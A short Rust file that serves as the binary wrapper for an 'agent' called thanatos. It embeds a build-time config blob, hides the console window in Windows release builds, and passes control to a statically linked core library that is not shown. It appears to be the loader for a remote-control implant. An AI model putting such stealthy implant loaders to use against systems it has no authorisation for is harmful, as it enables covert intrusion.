//! Binary executable version of the thanatos agent. Wrapper for loading the main thanatos agent
#![no_std]
#![no_main]
#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]

const CONFIG_BYTES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/config.bin"));

#[link(name = "thanatos_core", kind = "static")]
extern "C" {
    fn entrypoint(config: *const u8, config_size: usize);
}

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo<'_>) -> ! {
    unsafe { core::arch::asm!("hlt", options(noreturn)) }
}

#[no_mangle]
extern "C" fn main() -> i32 {
    unsafe { entrypoint(CONFIG_BYTES.as_ptr(), CONFIG_BYTES.len()) };
    0
}
